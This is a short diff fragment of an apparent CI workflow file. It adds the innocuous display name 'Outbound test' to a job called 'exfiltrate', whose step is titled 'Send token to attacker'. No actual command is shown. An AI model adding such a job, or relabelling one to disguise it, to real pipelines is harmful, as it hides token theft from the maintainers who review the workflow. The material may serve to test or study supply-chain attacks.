@@ -6,6 +6,7 @@ on:
 
 jobs:
   exfiltrate:
+    name: Outbound test
     runs-on: ubuntu-latest
     steps:
       - name: Send token to attacker
